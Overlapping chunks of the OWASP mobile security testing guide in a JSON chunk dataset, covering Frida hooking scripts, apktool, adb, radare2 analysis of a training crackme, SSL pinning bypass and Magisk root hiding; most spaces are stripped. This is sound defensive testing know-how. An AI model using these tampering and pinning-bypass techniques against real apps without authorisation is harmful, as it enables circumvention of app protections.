ReplaceJavamethodimplementations(JavaAPI). • EnumerateliveinstancesofspecificclassesbyscanningtheJavaheap(JavaAPI). • Scanprocessmemoryforoccurrencesofastring(MemoryAPI). • Interceptnativefunctioncallstorunyourowncodeatfunctionentryandexit(InterceptorAPI). RememberthatonAndroid,youcanalsobenefitfromthebuilt-intoolsprovidedwheninstallingFrida,thatincludesthe FridaCLI(frida),frida-ps,frida-ls-devicesandfrida-trace,tonamesomeofthem. Frida is often compared to Xposed, however this comparison is far from fair as both frameworks were designed with differentgoalsinmind. Thisisimportanttounderstandasanappsecuritytestersothatyoucanknowwhichframework touseinwhichsituation: • Fridaisstandalone,allyouneedistorunthefrida-serverbinaryfromaknownlocationinyourtargetAndroiddevice (see“InstallingFrida”below). Thismeansthat,incontrasttoXposed,itisnotdeepinstalledinthetargetOS. • Reversinganappisaniterativeprocess. Asaconsequenceofthepreviouspoint, youobtainashorterfeedback loopwhentestingasyoudon’tneedto(soft)reboottoapplyorsimplyupdateyourhooks. Soyoumightpreferto useXposedwhenimplementingmorepermanenthooks. • You may inject and update your Frida JavaScript code on the fly at any point during the runtime of your process (similarlytoCycriptoniOS).Thiswayyoucanperformtheso-calledearlyinstrumentationbylettingFridaspawn yourapporyoumayprefertoattachtoarunningappthatyoumighthavebroughttoacertainstate. • FridaisabletohandlebothJavaaswellasnativecode(JNI),allowingyoutomodifybothofthem. Thisisunfortu- natelyalimitationofXposedwhichlacksofnativecodesupport. NotethatXposed,asofearly2019,doesnotworkonAndroid9(APIlevel28)yet. Installing Frida on Android InordertosetupFridaonyourAndroiddevice: • Ifyourdeviceisnotrooted,youcanalsouseFrida,pleaserefertosection“DynamicAnalysisonNon-RootedDevices” ofthe“ReverseEngineeringandTampering”chapter. • Ifyouhavearooteddevice,simplyfollowtheofficialinstructionsorfollowthehintsbelow. Weassumearooteddevicehereunlessotherwisenoted. Downloadthefrida-serverbinaryfromtheFridareleasespage. Makesurethatyoudownloadtherightfrida-serverbinaryforthearchitectureofyourAndroiddeviceoremulator: x86, x86_64,armorarm64. Makesurethattheserverversion(atleastthemajorversionnumber)matchestheversionofyour localFridainstallation. PyPIusuallyinstallsthelatestversionofFrida. Ifyou’reunsurewhichversionisinstalled,youcan checkwiththeFridacommandlinetool: frida --version OryoucanrunthefollowingcommandtoautomaticallydetectFridaversionanddownloadtherightfrida-serverbinary: wget https://github.com/frida/frida/releases/download/$(frida --version)/frida-server-$(frida --version)-android-arm.xz Copyfrida-servertothedeviceandrunit: 529\\nadbpushfrida-server/data/local/tmp/ adbshell \"chmod755/data/local/tmp/frida-server\" adbshell \"su-c/data/local/tmp/frida-server&\" Using Frida on Android Withfrida-serverrunning,youshouldnowbeabletogetalistofrunningprocesseswiththefollowingcommand(usethe -UoptiontoindicateFridatouseaconnectedUSBdevicesoremulator): $frida-ps -U PID Name ----- -------------------------------------------------------------- 276 adbd 956 android.process.media 198 bridgemgrd 30692 com.android.chrome 30774 com.android.chrome:privileged_process0 30747 com.android.chrome:sandboxed 30834 com.android.chrome:sandboxed 3059 com.android.nfc 1526 com.android.phone 17104 com.android.settings 1302 com.android.systemui (...) Orrestrictthelistwiththe-Uaiflagcombinationtogetallapps(-a)currentlyinstalled(-i)ontheconnectedUSBdevice (-U): $frida-ps -Uai PID Name Identifier ----- ---------------------------------------- ------------------------------ 766 AndroidSystem android 30692 Chrome com.android.chrome 3520 ContactsStorage com.android.providers.contacts - Uncrackable1 sg.vantagepoint.uncrackable1 - drozerAgent com.mwr.dz Thiswillshowthenamesandidentifiersofallapps,iftheyarecurrentlyrunningitwillalsoshowtheirPIDs. Searchfor yourappinthelistandtakeanoteofthePIDoritsname/identifier. Fromnowonyou’llrefertoyourappbyusingoneof them. Arecommendationistousetheidentifiers,asthePIDswillchangeoneachrunoftheapp. Forexamplelet’stake com.android.chrome. YoucanusethisstringnowonallFridatools,e.g.ontheFridaCLI,onfrida-traceorfromaPython script. Tracing Native Libraries with frida-trace Totracespecific(low-level)librarycalls,youcanusethefrida-tracecommandlinetool: frida-trace -Ucom.android.chrome -i\"open\" This generates a little JavaScript in __handlers__/libc.so/open.js, which Frida injects into the process. The script tracesallcallstotheopenfunctioninlibc.so. YoucanmodifythegeneratedscriptaccordingtoyourneedswithFrida JavaScriptAPI. Unfortunatelytracinghigh-levelmethodsofJavaclassesisnotyetsupported(butmightbeinthefuture). Frida CLI and the Java API Use the Frida CLI tool (frida) to work with Frida interactively. It hooks into a process and gives you a command line interfacetoFrida’sAPI. frida -Ucom.android.chrome Withthe-loption,youcanalsousetheFridaCLItoloadscripts,e.g.,toloadmyscript.js: 530\\nfrida -U-lmyscript.jscom.android.chrome FridaalsoprovidesaJavaAPI,whichisespeciallyhelpfulfordealingwithAndroidapps. ItletsyouworkwithJavaclasses andobjectsdirectly. HereisascripttooverwritetheonResumefunctionofanActivityclass: Java.perform(function (){ varActivity =Java.use(\"android.app.Activity\"); Activity.onResume.implementation =function (){ console.log(\"[*]onResume()gotcalled!\"); this.onResume(); }; }); TheabovescriptcallsJava.performtomakesurethatyourcodegetsexecutedinthecontextoftheJavaVM.Itinstantiates awrapperfortheandroid.app.ActivityclassviaJava.useandoverwritestheonResumefunction. ThenewonResume functionimplementationprintsanoticetotheconsoleandcallstheoriginalonResumemethodbyinvokingthis.onResume everytimeanactivityisresumedintheapp. The JADX decompiler (v1.3.3 and",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 169
    }
  },
  {
    "text": "CLI tool (frida) to work with Frida interactively. It hooks into a process and gives you a command line interfacetoFrida’sAPI. frida -Ucom.android.chrome Withthe-loption,youcanalsousetheFridaCLItoloadscripts,e.g.,toloadmyscript.js: 530\\nfrida -U-lmyscript.jscom.android.chrome FridaalsoprovidesaJavaAPI,whichisespeciallyhelpfulfordealingwithAndroidapps. ItletsyouworkwithJavaclasses andobjectsdirectly. HereisascripttooverwritetheonResumefunctionofanActivityclass: Java.perform(function (){ varActivity =Java.use(\"android.app.Activity\"); Activity.onResume.implementation =function (){ console.log(\"[*]onResume()gotcalled!\"); this.onResume(); }; }); TheabovescriptcallsJava.performtomakesurethatyourcodegetsexecutedinthecontextoftheJavaVM.Itinstantiates awrapperfortheandroid.app.ActivityclassviaJava.useandoverwritestheonResumefunction. ThenewonResume functionimplementationprintsanoticetotheconsoleandcallstheoriginalonResumemethodbyinvokingthis.onResume everytimeanactivityisresumedintheapp. The JADX decompiler (v1.3.3 and above) can generate Frida snippets through its graphical code browser. To use this feature,opentheAPKorDEXwithjadx-gui,browsetothetargetmethod,rightclickthemethodname,andselect“Copy asfridasnippet(f)”. ForexampleusingtheMASTGUnCrackableAppforAndroidLevel1: Theabovestepsplacethefollowingoutputinthepasteboard,whichyoucanthenpasteinaJavaScriptfileandfeedinto frida -U -l. leta=Java.use(\"sg.vantagepoint.a.a\"); a[\"a\"].implementation =function (bArr,bArr2){ console.log('aiscalled' +',' +'bArr:' +bArr +',' +'bArr2:' +bArr2); letret=this.a(bArr,bArr2); console.log('aretvalueis' +ret); return ret; }; The above code hooks the a method within the sg.vantagepoint.a.a class and logs its input parameters and return values. 531\\nFridaalsoletsyousearchforandworkwithinstantiatedobjectsthatareontheheap. Thefollowingscriptsearchesfor instancesofandroid.view.ViewobjectsandcallstheirtoStringmethod. Theresultisprintedtotheconsole: setImmediate(function(){ console.log(\"[*]Startingscript\"); Java.perform(function (){ Java.choose(\"android.view.View\",{ \"onMatch\":function(instance){ console.log(\"[*]Instancefound:\" +instance.toString()); }, \"onComplete\":function(){ console.log(\"[*]Finishedheapsearch\") } }); }); }); Theoutputwouldlooklikethis: [*]Startingscript [*]Instancefound:android.view.View{7ccea78G.ED...........ID0,0-0,0 #7f0c01fcapp:id/action_bar_black_background} [*]Instancefound:android.view.View{2809551V.ED.............0,1731-0,1731 #7f0c01ffapp:id/menu_anchor_stub} [*]Instancefound:android.view.View{be471b6G.ED...........I.0,0-0,0 #7f0c01f5app:id/location_bar_verbose_status_separator} [*]Instancefound:android.view.View{3ae0eb7V.ED.............0,0-1080,63 #102002fandroid:id/statusBarBackground} [*]Finishedheapsearch YoucanalsouseJava’sreflectioncapabilities. Tolistthepublicmethodsoftheandroid.view.Viewclass,youcouldcreate awrapperforthisclassinFridaandcallgetMethodsfromthewrapper’sclassproperty: Java.perform(function (){ varview =Java.use(\"android.view.View\"); varmethods =view.class.getMethods(); for(vari=0;i<methods.length;i++){ console.log(methods[i].toString()); } }); Thiswillprintaverylonglistofmethodstotheterminal: public boolean android.view.View.canResolveLayoutDirection() public boolean android.view.View.canResolveTextAlignment() public boolean android.view.View.canResolveTextDirection() public boolean android.view.View.canScrollHorizontally(int) public boolean android.view.View.canScrollVertically(int) public final void android.view.View.cancelDragAndDrop() public void android.view.View.cancelLongPress() public final void android.view.View.cancelPendingInputEvents() ... Apktool Platform: android Availableat: https://github.com/iBotPeaches/Apktool Apktool is used to unpack Android app packages (APKs). Simply unzipping APKs with the standardunzip utility leaves somefilesunreadable. AndroidManifest.xmlisencodedintobinaryXMLformatwhichisn’treadablewithatexteditor. Also,theappresourcesarestillpackagedintoasinglearchivefile. When run with default command line flags, apktool automatically decodes the Android Manifest file to text-based XML formatandextractsthefileresources(italsodisassemblesthe.DEXfilestosmalicode-afeaturethatwe’llrevisitlater inthisbook). Amongtheunpackedfilesyoucanusuallyfind(afterrunningapktool d base.apk): • AndroidManifest.xml: ThedecodedAndroidManifestfile,whichcanbeopenedandeditedinatexteditor. • apktool.yml: filecontaininginformationabouttheoutputofapktool • original: foldercontainingtheMANIFEST.MFfile,whichcontainsinformationaboutthefilescontainedintheJARfile • res: directorycontainingtheapp’sresources 532\\n• smali: directorycontainingthedisassembledDalvikbytecode. You can also use apktool to repackage decoded resources back to binary APK/JAR. See the section “Exploring the App Package”lateronthischapterandsection“Repackaging”inthechapterTamperingandReverseEngineeringonAndroid formoreinformationandpracticalexamples. Termux Platform: android TermuxisaterminalemulatorforAndroidthatprovidesaLinuxenvironmentthatworksdirectlywithorwithoutrooting andwithnosetuprequired. TheinstallationofadditionalpackagesisatrivialtaskthankstoitsownAPTpackagemanager (whichmakesadifferenceincomparisontootherterminalemulatorapps). Youcansearchforspecificpackagesbyusing thecommandpkgsearch<pkg_name>andinstallpackageswithpkginstall<pkg_name>. YoucaninstallTermuxstraight fromGooglePlay. adb Platform: android adb(AndroidDebugBridge),shippedwiththeAndroidSDK,bridgesthegapbetweenyourlocaldevelopmentenvironment andaconnectedAndroiddevice. You’llusuallyleverageittotestappsontheemulatororaconnecteddeviceviaUSBor Wi-Fi. Usetheadb devicescommandtolisttheconnecteddevicesandexecuteitwiththe-largumenttoretrievemore detailsonthem. $adbdevices -l Listofdevicesattached 090c285c0b97f748deviceusb:1-1product:razormodel:Nexus_7device:flo emulator-5554 deviceproduct:sdk_google_phone_x86model:Android_SDK_built_for_x86device:generic_x86transport_id:1 adb provides other useful commands such as adb shell to start an interactive shell on a target and adb forward to forwardtrafficonaspecifichostporttoadifferentportonaconnectdevice. adbforwardtcp:<hostport>tcp:<deviceport> $adb -semulator-5554shell root@generic_x86:/ #ls acct cache charger config ... You’llcomeacrossdifferentusecasesonhowyoucanuseadbcommandswhentestinglaterinthisbook. Notethatyou mustdefinetheserialnummerofthetargetdevicewiththe-sargument(asshownbythepreviouscodesnippet)incase youhavemultipledevicesconnected. SSLUnpinning Platform: android Availableat: https://github.com/ac-pm/SSLUnpinning_Xposed AnXposedModuletobypassSSLcertificatepinning-https://github.com/ac-pm/SSLUnpinning_Xposed apkx 533\\nPlatform: android Availableat: https://github.com/muellerberndt/apkx apkxisaPythonwrappertopopularfreeDEXconvertersandJavadecompilers. Itautomatestheextraction,conversion, anddecompilationofAPKs. Installitasfollows: gitclonehttps://github.com/muellerberndt/apkx cdapkx sudo ./install.sh Thisshouldcopyapkxto/usr/local/bin. Seesection“DecompilingJavaCode”ofthe“ReverseEngineeringandTam- pering”chapterformoreinformationaboutusage. RootCloak Plus Platform: android Availableat: https://github.com/devadvance/rootcloakplus ACydiaSubstrateModuleusedtocheckforcommonlyknownindicationsofroot-https://github.com/devadvance/rootcl oakplus Angr Platform: android AngrisaPythonframeworkforanalyzingbinaries. Itisusefulforbothstaticanddynamicsymbolic(“concolic”)analysis. Inotherwords: givenabinaryandarequestedstate,Angrwilltrytogettothatstate,usingformalmethods(atechnique used for static code analysis) to find a path, as well as brute forcing. Using angr to get to the requestedstate is often muchfasterthantakingmanualstepsfordebuggingandsearchingthepathtowardstherequiredstate. Angroperates ontheVEXintermediatelanguageandcomeswithaloaderforELF/ARMbinaries,soitisperfectfordealingwithnative code,suchasnativeAndroidbinaries. Angrallowsfordisassembly,programinstrumentation,symbolicexecution,control-flowanalysis,data-dependencyanal- ysis,decompilationandmore,givenalargesetofplugins. Since version 8, Angr is based on Python 3, and can be installed with pip on *nix operating systems, macOS and Win- dows: pipinstallangr Someofangr’sdependenciescontainforkedversionsofthePythonmodulesZ3andPyVEX,whichwouldoverwrite theoriginalversions. Ifyou’reusingthosemodulesforanythingelse,youshouldcreateadedicatedvirtualenviron- mentwithVirtualenv. Alternatively,youcanalwaysusetheprovideddockercontainer. Seetheinstallationguide formoredetails. Comprehensive documentation, including an installation guide, tutorials, and usage examples are available on Angr’s Gitbookspage. AcompleteAPIreferenceisalsoavailable. YoucanuseangrfromaPythonREPL-suchasiPython-orscriptyourapproaches. Althoughangrhasabitofasteep learningcurve,wedorecommendusingitwhenyouwanttobruteforceyourwaytoagivenstateofanexecutable. Please seethe “SymbolicExecution” sectionof the “ReverseEngineering and Tampering”chapter as a greatexampleon how thiscanwork. Magisk 534\\nPlatform: android Magisk (“Magic Mask”) is one way to root your Android device. It’s specialty lies in the way the modifications on the systemareperformed. Whileotherrootingtoolsaltertheactualdataonthesystempartition,Magiskdoesnot(whichis called“systemless”). Thisenablesa waytohidethemodificationsfromroot-sensitiveapplications (e.g.forbankingor games)andallowsusingtheofficialAndroidOTAupgradeswithouttheneedtounrootthedevicebeforehand. YoucangetfamiliarwithMagiskreadingtheofficialdocumentationonGitHub. Ifyoudon’thaveMagiskinstalled,youcan findinstallationinstructionsinthedocumentation. IfyouuseanofficialAndroidversionandplantoupgradeit,Magisk providesatutorialonGitHub. LearnmoreaboutrootingyourdevicewithMagisk. FlowDroid Platform: android Availableat: https://github.com/secure-software-engineering/FlowDroid FlowDroid is an open-source tool based",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 170
    }
  },
  {
    "text": "how thiscanwork. Magisk 534\\nPlatform: android Magisk (“Magic Mask”) is one way to root your Android device. It’s specialty lies in the way the modifications on the systemareperformed. Whileotherrootingtoolsaltertheactualdataonthesystempartition,Magiskdoesnot(whichis called“systemless”). Thisenablesa waytohidethemodificationsfromroot-sensitiveapplications (e.g.forbankingor games)andallowsusingtheofficialAndroidOTAupgradeswithouttheneedtounrootthedevicebeforehand. YoucangetfamiliarwithMagiskreadingtheofficialdocumentationonGitHub. Ifyoudon’thaveMagiskinstalled,youcan findinstallationinstructionsinthedocumentation. IfyouuseanofficialAndroidversionandplantoupgradeit,Magisk providesatutorialonGitHub. LearnmoreaboutrootingyourdevicewithMagisk. FlowDroid Platform: android Availableat: https://github.com/secure-software-engineering/FlowDroid FlowDroid is an open-source tool based in soot, a framework dedicated to analyzing and translating Java bytecode for easier analysis. The tool handles the nuances of Android app lifecycles (like onCreate, onStart, onPause, and others) anditsUIcomponentsduringanalysisandperformstaintanalysisthatis: • Context-sensitive: Distinguishingbetweencallstothesamemethodbasedontheirspecificexecutioncontexts. • Object-sensitive: Identifyingindividualobjects,evenwhenthey’reofthesameclass. • Flow-sensitive: Recognizingthesequentialorderofcodeexecution. FlowDroidcanbeusedintwoways: asastandalonecommandlinetoolforquickanalysesorasalibraryformorecomplex investigations. Inadditiontoperformingtaintanalysis,FlowDroidcanalsogeneratecallgraphs,asillustratedinthisblog post. jdb Platform: android A Java Debugger which allows to set breakpoints and print application variables. jdb uses the JDWP protocol - https: //docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html APKLab Platform: android Availableat: https://github.com/APKLab/APKLab APKLabisaconvenientVisualStudioCodeextensionleveragingtoolssuchasapktoolandjadxtoenablefeaturesincluding appunpacking,decompilation,codepatching(e.g.forMITM),andrepackagingstraightfromtheIDE. Formoreinformation,youcanrefertoAPKLab’sofficialdocumentation. Busybox Platform: android Busybox combines multiple common Unix utilities into a small single executable. The utilities included generally have feweroptionsthantheirfull-featuredGNUcounterparts,butaresufficientenoughtoprovideacompleteenvironmenton asmallorembeddedsystem. BusyboxcanbeinstalledonarooteddevicebydownloadingtheBusyboxapplicationfrom GooglePlayStore. YoucanalsodownloadthebinarydirectlyfromtheBusyboxwebsite. Oncedownloaded,makeanadb push busybox /data/local/tmptohavetheexecutableavailableonyourphone. Aquickoverviewofhowtoinstalland useBusyboxcanbefoundintheBusyboxFAQ. 535\\nProguard Platform: android ProGuardisafreeJavaclassfileshrinker,optimizer,obfuscator,andpreverifier. Itdetectsandremovesunusedclasses, fields,methods,andattributesandcanalsobeusedtodeletelogging-relatedcode. MobSF for Android Platform: android Availableat: https://github.com/MobSF/Mobile-Security-Framework-MobSF AfterMobSFisdonewithitsanalysis,youwillreceiveaone-pageoverviewofalltheteststhatwereexecuted. Thepage issplitupintomultiplesectionsgivingsomefirsthintsontheattacksurfaceoftheapplication. Thefollowingisdisplayed: • Basicinformationabouttheappanditsbinaryfile. • Someoptionsto: – ViewtheAndroidManifest.xmlfile. – ViewtheIPCcomponentsoftheapp. • Signercertificate. • Apppermissions. • Asecurityanalysisshowingknowndefectse.g.iftheappbackupsareenabled. • ListoflibrariesusedbytheappbinaryandlistofallfilesinsidetheunzippedAPK. • MalwareanalysisthatchecksformaliciousURLs. RefertoMobSFdocumentationformoredetails. Bytecode Viewer Platform: android Bytecode Viewer (BCV) is a free and open source Java decompiler framework running on all operating systems. It is a versatiletoolwhichcanbeusedtodecompileAndroidapps, viewAPKresources(viaapktool)andeasilyeditAPKs(via Smali/Baksmali). Apart from APKs, also DEX, Java Class files and Java Jars can be viewed. One of its major features is 536\\nthesupportformultipleJavabytecodedecompilersunderoneGUI.BCVcurrentlyincludestheProcyon,CFR,Fernflower, Krakatau, and JADX-Core decompilers. These decompilers have different strengths and can be easily leveraged while usingBCV,especiallywhendealingwithobfuscatedprograms. radare2 for Android Platform: android Availableat: https://github.com/radare/radare2 radare2 (r2) is a popular open source reverse engineering framework for disassembling, debugging, patching and ana- lyzingbinaries that isscriptable and supports manyarchitecturesand file formatsincluding Androidand iOS apps. For Android, DalvikDEX(odex, multidex), ELF(executables, .so, ART)andJava(JNIandJavaclasses)aresupported. Italso containsseveralusefulscriptsthatcanhelpyouduringmobileapplicationanalysisasitofferslowleveldisassembling andsafestaticanalysisthatcomesinhandywhentraditionaltoolsfail. radare2implementsarichcommandlineinterface(CLI)whereyoucanperformthementionedtasks. However,ifyou’re notreallycomfortableusingtheCLIforreverseengineeringyoumaywanttoconsiderusingtheWebUI(viathe-Hflag) ortheevenmoreconvenientQtandC++GUIversioncallediaito. DokeepinmindthattheCLI,andmoreconcretelyits VisualModeanditsscriptingcapabilities(r2pipe),arethecoreofradare2’spowerandit’sdefinitelyworthlearninghow touseit. Installing radare2 Pleaserefertoradare2’sofficialinstallationinstructions. Wehighlyrecommendtoalwaysinstallradare2fromtheGitHub versioninsteadofviacommonpackagemanagerssuchasAPT.Radare2isinveryactivedevelopment,whichmeansthat thirdpartyrepositoriesareoftenoutdated. Using radare2 Theradare2frameworkcomprisesasetofsmallutilitiesthatcanbeusedfromther2shellorindependentlyasCLItools. Theseutilitiesincluderabin2,rasm2,rahash2,radiff2,rafind2,ragg2,rarun2,rax2,andofcourser2,whichisthe mainone. Forexample,youcanuserafind2toreadstringsdirectlyfromanencodedAndroidManifest(AndroidManifest.xml): ##Permissions $rafind2 -ZSpermissionAndroidManifest.xml ##Activities $rafind2 -ZSactivityAndroidManifest.xml ##Contentproviders $rafind2 -ZSproviderAndroidManifest.xml ##Services $rafind2 -ZSserviceAndroidManifest.xml ##Receivers $rafind2 -ZSreceiverAndroidManifest.xml Oruserabin2togetinformationaboutabinaryfile: $rabin2 -IUnCrackable-Level1/classes.dex arch dalvik baddr 0x0 binsz 5528 bintype class bits 32 canary false retguardfalse class 035 crypto false endian little havecodetrue laddr 0x0 lang dalvik linenum false lsyms false 537\\nmachine DalvikVM maxopsz 16 minopsz 1 nx false os linux pcalign 0 pic false relocs false sanitiz false static true strippedfalse subsys java va true sha1 12-5508c b7fafe72cb521450c4470043caa332da61d1bec7 adler32 12-5528c 00000000 Typerabin2 -htoseealloptions: $rabin2 -h Usage:rabin2 [-AcdeEghHiIjlLMqrRsSUvVxzZ][-@at][-aarch][-bbits][-Baddr] [-CF:C:D][-fstr][-maddr][-nstr][-Nm:M][-P[-P]pdb] [-ostr][-Ostr][-kquery][-Dlangsymname]file -@[addr] showsection,symbolorimportataddr -A listsub-binariesandtheirarch-bitspairs -a[arch] setarch (x86,arm,..or <arch>_<bits>) -b[bits] setbits (32,64...) -B[addr] overridebaseaddress (piebins) -c listclasses -cc listclassesinheaderformat -H headerfields -i imports (symbolsimportedfromlibraries) -I binaryinfo -j outputinjson ... Usethemainr2utilitytoaccessther2shell. YoucanloadDEXbinariesjustlikeanyotherbinary: r2classes.dex Enter r2 -h to see all available options. A very commonly used flag is -A, which triggers an analysis after loading the targetbinary. However,thisshouldbeusedsparinglyandwithsmallbinariesasitisverytimeandresourceconsuming. Youcanlearnmoreaboutthisinthechapter“TamperingandReverseEngineeringonAndroid”. Onceinther2shell,youcanalsoaccessfunctionsofferedbytheotherradare2utilities. Forexample,runningiwillprint theinformationofthebinary,exactlyasrabin2 -Idoes. Toprintallthestringsuserabin2 -Zorthecommandiz(orthelessverboseizq)fromther2shell. [0x000009c8]>izq 0xc503939/dev/com.koushikdutta.superuser.daemon/ 0xc792525/system/app/Superuser.apk ... 0xd2344445UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc= 0xd5132328d127684cbc37c17616d806cf50473cc 0xd7666 <init> 0xd831010AESerror: 0xd8f2020AES/ECB/PKCS7Padding 0xda51818Appisdebuggable! 0xdc099CodeCheck 0x11ac77Nope... 0x11bf1414Rootdetected! Mostofthetimeyoucanappendspecialoptionstoyourcommandssuchasqtomakethecommandlessverbose(quiet) orjtogivetheoutputinJSONformat(use~{}toprettifytheJSONstring). [0x000009c8]>izj~{} [ { \"vaddr\":3152, \"paddr\": 3152, \"ordinal\":1, \"size\":39, \"length\":39, \"section\":\"file\", \"type\":\"ascii\", \"string\":\"L2Rldi9jb20ua291c2hpa2R1dHRhLnN1cGVydXNlci5kYWVtb24v\" }, 538\\n{ \"vaddr\":3193, \"paddr\":3193, \"ordinal\":2, \"size\":25, \"length\":25,",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 171
    }
  },
  {
    "text": "triggers an analysis after loading the targetbinary. However,thisshouldbeusedsparinglyandwithsmallbinariesasitisverytimeandresourceconsuming. Youcanlearnmoreaboutthisinthechapter“TamperingandReverseEngineeringonAndroid”. Onceinther2shell,youcanalsoaccessfunctionsofferedbytheotherradare2utilities. Forexample,runningiwillprint theinformationofthebinary,exactlyasrabin2 -Idoes. Toprintallthestringsuserabin2 -Zorthecommandiz(orthelessverboseizq)fromther2shell. [0x000009c8]>izq 0xc503939/dev/com.koushikdutta.superuser.daemon/ 0xc792525/system/app/Superuser.apk ... 0xd2344445UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc= 0xd5132328d127684cbc37c17616d806cf50473cc 0xd7666 <init> 0xd831010AESerror: 0xd8f2020AES/ECB/PKCS7Padding 0xda51818Appisdebuggable! 0xdc099CodeCheck 0x11ac77Nope... 0x11bf1414Rootdetected! Mostofthetimeyoucanappendspecialoptionstoyourcommandssuchasqtomakethecommandlessverbose(quiet) orjtogivetheoutputinJSONformat(use~{}toprettifytheJSONstring). [0x000009c8]>izj~{} [ { \"vaddr\":3152, \"paddr\": 3152, \"ordinal\":1, \"size\":39, \"length\":39, \"section\":\"file\", \"type\":\"ascii\", \"string\":\"L2Rldi9jb20ua291c2hpa2R1dHRhLnN1cGVydXNlci5kYWVtb24v\" }, 538\\n{ \"vaddr\":3193, \"paddr\":3193, \"ordinal\":2, \"size\":25, \"length\":25, \"section\":\"file\", \"type\":\"ascii\", \"string\":\"L3N5c3RlbS9hcHAvU3VwZXJ1c2VyLmFwaw==\" }, Youcanprinttheclassnamesandtheirmethodswithther2commandic(informationclasses). [0x000009c8]>ic ... 0x0000073c[0x00000958 -0x00000abc] 356class5Lsg/vantagepoint/uncrackable1/MainActivity ::Landroid/app/Activity; 0x00000958method0pC Lsg/vantagepoint/uncrackable1/MainActivity.method.<init>()V 0x00000970method1P Lsg/vantagepoint/uncrackable1/MainActivity.method.a(Ljava/lang/String;)V 0x000009c8method2r Lsg/vantagepoint/uncrackable1/MainActivity.method.onCreate (Landroid/os/Bundle;)V 0x00000a38method3p Lsg/vantagepoint/uncrackable1/MainActivity.method.verify (Landroid/view/View;)V 0x0000075c[0x00000acc -0x00000bb2] 230class6Lsg/vantagepoint/uncrackable1/a::Ljava/lang/Object; 0x00000accmethod0sp Lsg/vantagepoint/uncrackable1/a.method.a(Ljava/lang/String;)Z 0x00000b5cmethod1sp Lsg/vantagepoint/uncrackable1/a.method.b(Ljava/lang/String;)[B Youcanprinttheimportedmethodswithther2commandii(informationimports). [0x000009c8]>ii [Imports] Num Vaddr Bind TypeName ... 290x000005cc NONE FUNCLjava/lang/StringBuilder.method.append(Ljava/lang/String;)Ljava/lang/StringBuilder; 300x000005d4 NONE FUNCLjava/lang/StringBuilder.method.toString()Ljava/lang/String; 310x000005dc NONE FUNCLjava/lang/System.method.exit(I)V 320x000005e4 NONE FUNCLjava/lang/System.method.getenv(Ljava/lang/String;)Ljava/lang/String; 330x000005ec NONE FUNCLjavax/crypto/Cipher.method.doFinal([B)[B 340x000005f4 NONE FUNCLjavax/crypto/Cipher.method.getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher; 350x000005fc NONE FUNCLjavax/crypto/Cipher.method.init(ILjava/security/Key;)V 360x00000604 NONE FUNCLjavax/crypto/spec/SecretKeySpec.method.<init>([BLjava/lang/String;)V Acommonapproachwheninspectingabinaryistosearchforsomething,navigatetoitandvisualizeitinordertointerpret thecode. Oneofthewaystofindsomethingusingradare2isbyfilteringtheoutputofspecificcommands, i.e.togrep themusing~plusakeyword(~+forcase-insensitive). Forexample,wemightknowthattheappisverifyingsomething, wecaninspectallradare2flagsandseewherewefindsomethingrelatedto“verify”. Whenloadingafile, radare2tagseverythingit’sabletofind. Thesetaggednamesorreferencesarecalledflags. Youcanaccessthemviathecommandf. Inthiscasewewillgreptheflagsusingthekeyword“verify”: [0x000009c8]>f~+verify 0x00000a38132sym.Lsg_vantagepoint_uncrackable1_MainActivity.method. \\ verify_Landroid_view_View__V 0x00000a38132method.public.Lsg_vantagepoint_uncrackable1_MainActivity. \\ Lsg_vantagepoint_uncrackable1 _MainActivity.method.verify_Landroid_view_View__V 0x000014006str.verify Itseemsthatwe’vefoundonemethodin0x00000a38(thatwastaggedtwotimes)andonestringin0x00001400. Let’s navigate(seek)tothatmethodbyusingitsflag: [0x000009c8]>ssym.Lsg_vantagepoint_uncrackable1_MainActivity.method. \\ verify_Landroid_view_View__V Andofcourseyoucanalsousethedisassemblercapabilitiesofr2andprintthedisassemblywiththecommandpd(or pdfifyouknowyou’realreadylocatedinafunction). [0x00000a38]>pd 539\\nr2commandsnormallyacceptoptions(seepd?),e.g.youcanlimittheopcodesdisplayedbyappendinganumber(“N”) tothecommandpd N. Insteadofjustprintingthedisassemblytotheconsoleyoumaywanttoentertheso-calledVisualModebytypingV. By default, you will see the hexadecimal view. By typing p you can switch to different views, such as the disassembly view: Radare2offersaGraphModethatisveryusefultofollowtheflowofthecode. YoucanaccessitfromtheVisualMode bytypingV: 540\\nThisisonlyaselectionofsomeradare2commandstostartgettingsomebasicinformationfromAndroidbinaries. Radare2 isverypowerfulandhasdozensofcommandsthatyoucanfindontheradare2commanddocumentation. Radare2will beusedthroughouttheguidefordifferentpurposessuchasreversingcode,debuggingorperformingbinaryanalysis. We willalsouseitincombinationwithotherframeworks,especiallyFrida(seether2fridasectionformoreinformation). Pleaserefertothechapter“TamperingandReverseEngineeringonAndroid”formoredetaileduseofradare2onAndroid, especiallywhenanalyzingnativelibraries. Youmayalsowanttoreadtheofficialradare2book. Android NDK Platform: android TheAndroidNDKcontainsprebuiltversionsofthenativecompilerandtoolchain. BoththeGCCandClangcompilershave traditionallybeensupported,butactivesupportforGCCendedwithNDKrevision14. Thedevicearchitectureandhost OSdeterminetheappropriateversion. TheprebuilttoolchainsareinthetoolchainsdirectoryoftheNDK,whichcontains onesubdirectoryforeacharchitecture. Architecture Toolchainname ARM-based arm-linux-androideabi-<gcc-version> x86-based x86-<gcc-version> MIPS-based mipsel-linux-android-<gcc-version> ARM64-based aarch64-linux-android-<gcc-version> X86-64-based x86_64-<gcc-version> MIPS64-based mips64el-linux-android-<gcc-version> Besidespickingtherightarchitecture,youneedtospecifythecorrectsysrootforthenativeAPIlevelyouwanttotarget. Thesysrootisadirectorythatcontainsthesystemheadersandlibrariesforyourtarget. NativeAPIsvarybyAndroidAPI 541\\nlevel. AvailablesysrootdirectoriesforeachAndroidAPIlevelcanbefoundin$NDK/platforms/. EachAPIleveldirectory containssubdirectoriesforthevariousCPUsandarchitectures. Onepossibilityforsettingupthebuildsystemisexportingthecompilerpathandnecessaryflagsasenvironmentvariables. To make things easier, however, the NDK allows you to create a so-called standalone toolchain, which is a temporary 